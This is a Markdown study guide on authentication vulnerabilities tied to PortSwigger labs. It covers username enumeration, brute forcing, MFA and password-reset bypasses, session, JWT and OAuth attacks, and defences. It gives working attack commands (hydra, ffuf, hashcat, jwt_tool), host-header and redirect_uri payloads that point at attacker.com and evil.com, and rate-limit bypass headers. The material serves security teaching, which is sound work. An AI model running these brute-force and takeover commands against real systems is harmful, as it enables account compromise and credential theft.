# 05 – Authentication Vulnerabilities

> **OWASP Top 10 2025 — A07: Identification and Authentication Failures**
> Lab Platform: PortSwigger Web Security Academy

---

## Table of Contents

1. [Overview](#overview)
2. [How Authentication Works](#how-authentication-works)
3. [Types of Authentication Mechanisms](#types-of-authentication-mechanisms)
4. [Authentication Vulnerability Classes](#authentication-vulnerability-classes)
5. [Attack Techniques](#attack-techniques)
6. [Multi-Factor Authentication (MFA) Attacks](#multi-factor-authentication-mfa-attacks)
7. [Password-Based Attack Techniques](#password-based-attack-techniques)
8. [Session & Token Attacks](#session--token-attacks)
9. [OAuth & SSO Vulnerabilities](#oauth--sso-vulnerabilities)
10. [Finding Authentication Vulnerabilities](#finding-authentication-vulnerabilities)
11. [Tools](#tools)
12. [Defence & Mitigation](#defence--mitigation)
13. [Lab Setup](#lab-setup)
14. [Study Path](#study-path)

---

## Overview

Authentication is the process of **verifying who a user is**. It is the gateway to every protected resource in a web application. Broken authentication is one of the most critical vulnerability classes, consistently ranking in the OWASP Top 10 because a compromised authentication mechanism gives an attacker **direct access to the entire application as a legitimate user**.

```
Client  →  Credential Submission  →  Server Validation  →  Session Created
                                            ↑
                              Attacker targets this process
```

**Root Cause:** Weak implementation decisions — poor password policies, no rate limiting, insecure session handling, logic flaws in multi-step flows, or trusting unvalidated user-supplied data.

**Authentication vs. Authorisation:**
- **Authentication** — Verifies *who* you are (identity)
- **Authorisation** — Determines *what* you are allowed to do (access control)

> Breaking authentication often leads directly to broken authorisation, privilege escalation, and full account takeover.

---

## How Authentication Works

### The Basic Login Flow

```
1. User submits credentials (username + password)
2. Server looks up user record in database
3. Server hashes the submitted password and verifies it against the stored hash
4. On match → session token created and returned to client
5. Client stores session token (cookie / localStorage)
6. Token is sent with every subsequent request
7. Server validates token and grants access
```

### Password Hashing (Secure)

```
User password  →  bcrypt/argon2/scrypt hash  →  stored in DB
               ↑
        salted + iterated (expensive to brute-force)
```

### Vulnerable Pattern (Insecure)

```php
// VULNERABLE — direct string comparison of plaintext passwords
if ($_POST['password'] === $db_password) { login(); }

// VULNERABLE — MD5 hash (fast to crack, no salt)
if (md5($_POST['password']) === $db_hash) { login(); }
```

---

## Types of Authentication Mechanisms

### 1. Password-Based Authentication

The most common mechanism. User supplies a username and password that the server compares against stored credentials.

**Common weaknesses:**
- Weak default passwords
- No account lockout → brute-force possible
- Passwords stored in plaintext or weak hash (MD5, SHA1)
- Password reuse across services

### 2. Multi-Factor Authentication (MFA)

Combines two or more factors:
- **Something you know** — password, PIN, security question
- **Something you have** — TOTP app, SMS code, hardware key
- **Something you are** — biometrics

**Common weaknesses:**
- OTP codes not rate-limited
- OTP codes with long validity windows
- Business logic flaws allowing MFA bypass
- SMS-based 2FA vulnerable to SIM swapping

### 3. Token-Based Authentication

Client stores a stateless token (JWT, API key, OAuth token) and sends it with each request.

**Common weaknesses:**
- JWT with `alg: none` accepted
- Weak JWT secrets
- Tokens never expire
- Tokens not invalidated on logout

### 4. Cookie-Based Sessions

Server issues a session cookie after login. Cookie maps to a server-side session record.

**Common weaknesses:**
- Predictable session IDs
- Session fixation
- Missing `HttpOnly`, `Secure`, `SameSite` flags
- Sessions not invalidated on logout

### 5. Single Sign-On (SSO) / OAuth 2.0

Delegated authentication — trust a third-party identity provider (Google, GitHub, etc.)

**Common weaknesses:**
- `state` parameter not validated → CSRF
- `redirect_uri` not restricted → token theft
- Implicit flow exposing tokens in URL

---

## Authentication Vulnerability Classes

### Class 1 — Username Enumeration

**What it is:** The application reveals whether a username exists through different responses.

```
Valid username:    "Incorrect password"       ← reveals user exists
Invalid username:  "User does not exist"      ← reveals user does NOT exist
```

**Attack surface:**
- Login page (response differences)
- Registration page ("username already taken")
- Password reset page ("email sent" vs "email not found")
- Response timing differences (even with same message)

---

### Class 2 — Brute Force Attacks

**What it is:** Systematically trying many passwords until the correct one is found.

**Attack types:**
- **Simple brute force** — try all combinations (slow)
- **Dictionary attack** — use wordlist of common passwords
- **Credential stuffing** — use leaked username:password pairs from data breaches
- **Password spraying** — one common password tried against many accounts (avoids lockout)

```
Tool: hydra / Burp Intruder / ffuf
Target: POST /login  →  password=§FUZZ§
```

---

### Class 3 — Insecure "Remember Me" / Persistent Login

**What it is:** Predictable or poorly protected "remember me" cookie values.

```
remember_me=dXNlcjoxMjM=   → base64("user:123")
# Attacker changes 123 to 456 to log in as user 456
```

---

### Class 4 — Broken Password Reset

**What it is:** Logic flaws in the password reset flow that allow account takeover.

- Token leaked in `Referer` header
- Token not expiring after use
- Token predictable (timestamp-based)
- Host header injection → reset link sent to attacker domain
- User-supplied email trusted without validation

---

### Class 5 — Business Logic Flaws in Multi-Step Auth

**What it is:** The authentication flow has multiple steps, and the application trusts that users completed earlier steps without re-validating.

```
Step 1: Enter username + password (attacker knows this)
Step 2: Enter MFA code         (attacker skips directly to this URL)
Step 3: Logged in as victim    ← Bypassed step 2 via direct URL access
```

---

### Class 6 — Insecure Session Management

**What it is:** Session tokens that are predictable, long-lived, or not properly invalidated.

```
Session ID:  PHPSESSID=1001   → change to 1002 → different user
Session ID:  MD5(username+timestamp) → predictable
```

---

### Class 7 — HTTP Basic Authentication

**What it is:** Credentials encoded in base64 and sent in the `Authorization` header on every request.

```
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
              → base64("admin:password")
```

Base64 is **NOT encryption** — it is trivially reversible. Credentials are exposed in plaintext without HTTPS.

> **Note on HTTP Digest:** Digest Authentication is different — it uses a challenge-response mechanism (MD5 hash of credentials + server nonce). It does NOT send credentials in base64. However, it is still considered weak and is rarely used in modern applications.

---

## Attack Techniques

### Technique 1 — Username Enumeration via Response Differences

**Step 1:** Observe responses for valid vs. invalid usernames.

```http
POST /login HTTP/1.1

username=valid_user&password=wrong
→ Response: "Incorrect password"

username=invalid_user&password=wrong
→ Response: "Invalid username or password"
```

**Step 2:** Use Burp Intruder to enumerate usernames against a wordlist.

```
Attack type: Sniper
Payload position: username=§FUZZ§&password=wrong
Payload: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Filter: Look for different response length or status code
```

**Step 3:** With valid username — brute force password.

---

### Technique 2 — Password Brute Force (No Rate Limiting)

```bash
# Hydra HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid password"

# FFuf
ffuf -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302   # filter 302 if failed login redirects back; use -fc 200 if failed login stays on same page

# Burp Intruder — Cluster Bomb (username + password)
# Position 1: username=§admin§
# Position 2: password=§FUZZ§
```

---

### Technique 3 — Bypassing IP-Based Rate Limiting

Many applications block repeated failed logins from the same IP. Bypass techniques:

```http
# X-Forwarded-For header spoofing
X-Forwarded-For: 1.2.3.4        (rotate IPs each request)

# X-Real-IP
X-Real-IP: 10.0.0.1

# Add to Burp Intruder payloads — rotate IP in header
```

```python
# Pitchfork attack: rotate both the IP and the password simultaneously
# 1.2.3.1  →  password1
# 1.2.3.2  →  password2
# 1.2.3.3  →  password3
```

---

### Technique 4 — Password Reset Token Attack

```bash
# Step 1: Trigger password reset for victim
POST /forgot-password
email=victim@example.com

# Step 2: Intercept reset link in proxy
# Reset URL: https://target.com/reset?token=abc123

# Step 3: Analyse token
# Is it predictable? (timestamp-based, sequential, short)
# Does it expire after use?
# Check Referer leak if page loads external resources

# Step 4: Brute force token (if short)
ffuf -u https://target.com/reset?token=FUZZ \
  -w tokens.txt \
  -fc 200

# Step 5: Host header injection
POST /forgot-password HTTP/1.1
Host: attacker.com                   ← server sends reset link to attacker domain
email=victim@example.com
```

---

### Technique 5 — Insecure "Remember Me" Cookie

```bash
# Observe remember_me cookie value after checking "remember me"
Cookie: remember_me=dXNlcjoxMjM=

# Decode base64
echo "dXNlcjoxMjM=" | base64 -d
# Output: user:123

# Re-encode as different user
echo -n "user:1" | base64
# Output: dXNlcjox

# Replace cookie value
Cookie: remember_me=dXNlcjox
# Now authenticated as user ID 1 (likely admin)
```

---

### Technique 6 — MFA Bypass via URL Jumping

```
# Normal flow:
GET /login → POST credentials → GET /mfa → POST OTP → GET /dashboard

# Attack:
# After step 1 (valid creds submitted), jump directly to:
GET /dashboard  → if session cookie was set after step 1, MFA is bypassed
```

---

### Technique 7 — OTP Brute Force

```bash
# If OTP has no rate limit (4-digit: 10,000 combinations)
ffuf -u https://target.com/mfa \
  -X POST \
  -d "otp=FUZZ" \
  -w <(seq -w 0 9999) \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302

# Burp Intruder — Numbers payload 0000 to 9999
# Filter for successful response
```

---

### Technique 8 — Credential Stuffing

```bash
# Use known leaked credential pairs (e.g., from HaveIBeenPwned datasets)

# Hydra — credential stuffing with user:pass list
hydra -C leaked_credentials.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Login failed"

# ffuf — two separate wordlists (username + password, pitched together)
ffuf -u https://target.com/login \
  -X POST \
  -d "username=HFUZZ&password=WFUZZ" \
  -w usernames.txt:HFUZZ \
  -w passwords.txt:WFUZZ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302
```

---

## Multi-Factor Authentication (MFA) Attacks

### Attack 1 — OTP Leakage in Response

```
# Sometimes OTP is returned in the HTTP response body or header
# Check for:
Response body: {"otp": "123456"}
Response header: X-OTP-Debug: 123456
```

### Attack 2 — OTP Reuse

```
# If OTP is not invalidated after first use
# Use the same OTP again for a different account
```

### Attack 3 — SIM Swapping (out-of-scope for web pentesting)

> Attacker social-engineers carrier to transfer victim's phone number to attacker SIM → receives all SMS OTPs.

### Attack 4 — Backup Code Brute Force

```bash
# Backup codes are often 6-8 digit numbers
# If no rate limit:
ffuf -u https://target.com/recovery \
  -X POST \
  -d "backup_code=FUZZ" \
  -w <(seq -w 100000 999999)
```

### Attack 5 — TOTP Secret Leakage

```
# QR code URL contains the TOTP secret
otpauth://totp/Example:user@example.com?secret=JBSWY3DPEHPK3PXP&issuer=Example

# Extract secret and generate valid OTPs on attacker machine:
python3 -c "import pyotp; print(pyotp.TOTP('JBSWY3DPEHPK3PXP').now())"
```

---

## Password-Based Attack Techniques

### Wordlist Sources

| Wordlist | Use Case |
| --- | --- |
| `rockyou.txt` | General password brute force |
| `SecLists/Passwords/Common-Credentials/` | Top N most common passwords |
| `SecLists/Passwords/Leaked-Databases/` | Known breach dumps |
| `SecLists/Usernames/` | Username enumeration |
| Custom wordlists from OSINT | Target-specific (company name, domain, etc.) |

### Password Mutation Rules (Hashcat / John)

```bash
# Hashcat rules
hashcat -a 0 -r /usr/share/hashcat/rules/best64.rule \
  hashes.txt rockyou.txt

# Common mutations:
# password → Password, password1, p@ssword, P@$$w0rd

# John the Ripper with rules
john --wordlist=rockyou.txt --rules=KoreLogic hash.txt
```

### Online Hash Cracking

```bash
# If you obtain a hash from DB dump or error response:
# MD5: crack via CrackStation, hashkiller, or hashcat
# bcrypt: hashcat -m 3200

echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashid
# → MD5 → crackstation.net → "password"
```

---

## Session & Token Attacks

### Session Fixation

```
# Attacker sets a known session ID before victim logs in
GET /login
Cookie: PHPSESSID=attacker_known_value

# Victim logs in using that session ID
# After login, server keeps same session ID
# Attacker uses the known session ID to gain authenticated access
```

### Session Hijacking

```
# Steal session cookie via:
# 1. XSS: document.cookie
# 2. Man-in-the-middle (HTTP, no HTTPS)
# 3. Network sniffing (insecure WiFi)
# 4. Predictable session ID (enumerate)
```

### JWT Attacks

```bash
# 1. Algorithm confusion (RS256 → HS256)
# Change header: {"alg": "HS256"}
# Sign with RSA public key as HMAC secret

# 2. None algorithm
# Change header: {"alg": "none"}
# Remove signature → server accepts unsigned token

# 3. Weak secret brute force
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# 4. jwks.json manipulation
# Point jku/x5u header to attacker-controlled JWKS endpoint
```

---

## OAuth & SSO Vulnerabilities

### OAuth State Parameter CSRF

```
# Authorize URL without state parameter:
GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback

# Attacker creates a crafted authorize URL, tricks victim into visiting
# Victim's account gets linked to attacker's OAuth identity
```

### Redirect URI Manipulation

```
# Registered redirect URIs:
# https://app.com/callback

# Attack — try variations:
https://app.com.evil.com/callback
https://app.com/callback/../../../evil
https://app.com/callback?extra=param
```

### Open Redirect in OAuth Flow

```
# If redirect_uri allows open redirects:
GET /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://attacker.com

# Authorization code is leaked to attacker via Referer header
```

---

## Finding Authentication Vulnerabilities

### Recon Checklist

```
[ ] Map all authentication endpoints
    /login, /register, /forgot-password, /reset-password
    /api/auth/*, /oauth/*, /sso/*

[ ] Test login page for:
    - Username enumeration (response difference, timing, message)
    - Rate limiting (try >10 failed logins)
    - Account lockout mechanism
    - CAPTCHA bypass

[ ] Test password reset:
    - Token length and entropy
    - Token expiry (try old tokens)
    - Token single-use enforcement
    - Host header injection
    - Referer header leakage

[ ] Test MFA:
    - Can you skip directly to /dashboard after step 1?
    - Is OTP rate-limited?
    - Does OTP expire after use?
    - Are backup codes rate-limited?

[ ] Test session management:
    - Session token entropy (use Burp Sequencer)
    - HttpOnly, Secure, SameSite cookie flags
    - Session invalidation on logout
    - Session invalidation on password change

[ ] Test "remember me" cookies:
    - Decode (base64, hex, JWT)
    - Is it predictable?
    - Can it be forged for another user?

[ ] Test JWT (if used):
    - alg: none
    - RS256 → HS256 confusion
    - Weak secret (crack with hashcat)
    - kid / jku / x5u header injection
```

### Burp Suite Workflow

```
1. Proxy → capture login request
2. Send to Intruder → attack type: Sniper
3. Set payload position on username field
4. Payload: SecLists username wordlist
5. Look for: length difference, status code difference, different response message
6. Confirmed valid username → repeat with password payload
7. Use Cluster Bomb for simultaneous username + password brute force

8. Use Sequencer on session tokens to measure entropy
   Burp → Proxy → HTTP history → Right-click session token → Send to Sequencer
```

### Timing Attack

```python
# Measure response time difference between valid and invalid usernames
import requests, time

for username in open('usernames.txt'):
    start = time.time()
    requests.post('https://target.com/login', data={
        'username': username.strip(),
        'password': 'wrongpassword'
    })
    elapsed = time.time() - start
    print(f"{username.strip()}: {elapsed:.3f}s")

# Valid usernames often take longer (DB lookup completes before hash comparison)
```

---

## Tools

### Hydra — Network Login Brute Forcer

```bash
# HTTP POST form
hydra -l admin -P rockyou.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET Basic Auth
hydra -l admin -P rockyou.txt -s 443 -S target.com http-get /admin

# SSH
hydra -l root -P rockyou.txt ssh://target.com

# FTP
hydra -l admin -P rockyou.txt ftp://target.com
```

### ffuf — Web Fuzzer

```bash
# Username enumeration
ffuf -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=wrong" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fw 5

# Password brute force (known username)
ffuf -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200 -mc 302
```

### Burp Suite

```
Key features for auth testing:
- Intruder     → brute force / enumeration
- Sequencer    → session token entropy analysis
- Repeater     → manual manipulation of requests
- Logger       → traffic inspection
- JWT Editor   → JWT manipulation (extension)
- Autorize     → access control testing (extension)
```

### jwt_tool

```bash
# Install
pip3 install jwt_tool

# Scan for common JWT vulnerabilities
python3 jwt_tool.py <token> -t https://target.com/api/user

# None algorithm attack
python3 jwt_tool.py <token> -X a

# RS256 to HS256 confusion
python3 jwt_tool.py <token> -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py <token> -C -d rockyou.txt
```

### Hashcat — Password Hash Cracking

```bash
# MD5
hashcat -m 0 hash.txt rockyou.txt

# SHA-1
hashcat -m 100 hash.txt rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt rockyou.txt

# JWT HS256
hashcat -m 16500 token.jwt rockyou.txt

# With rules
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Other Tools

| Tool | Use |
| --- | --- |
| `patator` | Modular brute forcer (HTTP, SSH, FTP, DB) |
| `medusa` | Parallel network login auditor |
| `CeWL` | Generate custom wordlists from website content |
| `Mentalist` | GUI wordlist generator with rules |
| `PyOTP` | Generate/verify TOTP codes |
| `crackstation.net` | Online hash lookup |
| `whatweb` | Fingerprint web tech (auth type hints) |

---

## Defence & Mitigation

### Primary Defences

#### 1. Rate Limiting & Account Lockout

```python
# Lock account after N failed attempts
# Or use progressive delay (exponential backoff)
if failed_attempts >= 5:
    lock_account(user_id, duration=15*60)  # 15 min lockout

# Use distributed rate limiting (Redis-based)
# Limit by: IP + username combination
```

#### 2. Strong Password Policy + Hashing

```python
# NEVER store plaintext passwords
# Use bcrypt, argon2id, or scrypt

import bcrypt

# Hash
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Verify
bcrypt.checkpw(submitted_password.encode(), hashed)
```

#### 3. Multi-Factor Authentication

```
- Enforce TOTP (Google Authenticator, Authy) over SMS
- Use hardware keys (FIDO2/WebAuthn) for privileged accounts
- Apply MFA to: login, password change, email change, high-value actions
```

#### 4. Secure Session Management

```http
# Cookie flags
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

# Session lifecycle
- Generate new session ID on login (prevent fixation)
- Invalidate session on logout (server-side)
- Implement idle + absolute timeouts
- Rotate session on privilege change
```

#### 5. Secure Password Reset

```
- Generate cryptographically random tokens (min 128 bits)
- Token expires after 15-60 minutes
- Token is single-use (invalidate after first use)
- Send to verified email only
- Use a short-lived, single-use token; submit it by POST after the reset link is opened
- Set a strict `Referrer-Policy` and avoid third-party resources on reset pages to prevent token leakage
- Validate Host header — use configured application URL, not user-supplied
```

### Defence Matrix

| Vulnerability | Primary Fix | Secondary Fix |
| --- | --- | --- |
| Username enumeration | Uniform response messages | Uniform response timing |
| Brute force | Rate limiting / lockout | CAPTCHA, MFA |
| Credential stuffing | Breached password check | MFA, anomaly detection |
| Weak password reset | Random token + expiry | Host header validation |
| MFA bypass | Re-validate session at each step | Bind MFA to session state |
| Session fixation | New session ID on login | Strict session validation |
| Weak session ID | CSPRNG session tokens | Burp Sequencer entropy test |
| JWT none attack | Reject `alg: none` | Pin algorithm server-side |
| Password storage | bcrypt / argon2id | Min cost factor = 12 |
| Remember me abuse | HMAC-signed token | Short expiry + re-auth |

---

## Lab Setup

```
Platform : PortSwigger Web Security Academy
URL      : https://portswigger.net/web-security/authentication

Lab types:
  - Username enumeration via different responses
  - Username enumeration via subtly different responses
  - Username enumeration via response timing
  - Password brute-force via account lockout bypass
  - Broken brute-force protection (IP block bypass)
  - Broken brute-force protection (multiple credentials per request)
  - 2FA simple bypass
  - 2FA broken logic
  - 2FA bypass using a brute-force attack
  - Offline password cracking (stolen cookie)
  - Password reset broken logic
  - Password reset via email hosting link (Host header injection)
  - Password change (username enumeration)

Recommended Tools:
  - Burp Suite Community/Pro
  - FoxyProxy (browser extension for proxy routing)
  - SecLists (wordlists)
```

---

## Study Path

```
Beginner
  ├── Understand HTTP basics (cookies, sessions, headers)
  ├── Learn how login flows work (intercept with Burp)
  └── PortSwigger: Authentication apprentice labs (1-3)

Intermediate
  ├── Username enumeration techniques (timing, messages)
  ├── Rate limiting bypass (X-Forwarded-For, cluster bomb)
  ├── Password reset token analysis
  └── PortSwigger: Authentication practitioner labs (4-10)

Advanced
  ├── MFA bypass (session skip, OTP brute force)
  ├── JWT attacks (jwt_tool, alg confusion)
  ├── OAuth flow attacks (state, redirect_uri)
  └── PortSwigger: Authentication expert labs

Resources
  ├── PortSwigger Academy: https://portswigger.net/web-security/authentication
  ├── OWASP Auth Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
  ├── HackTricks - Authentication: https://book.hacktricks.xyz/pentesting-web/login-bypass
  └── JWT Attacks: https://portswigger.net/web-security/jwt
```

---

*Reference: OWASP Top 10 2025 A07 – Identification and Authentication Failures | PortSwigger Authentication Labs | HackTricks Login Bypass*
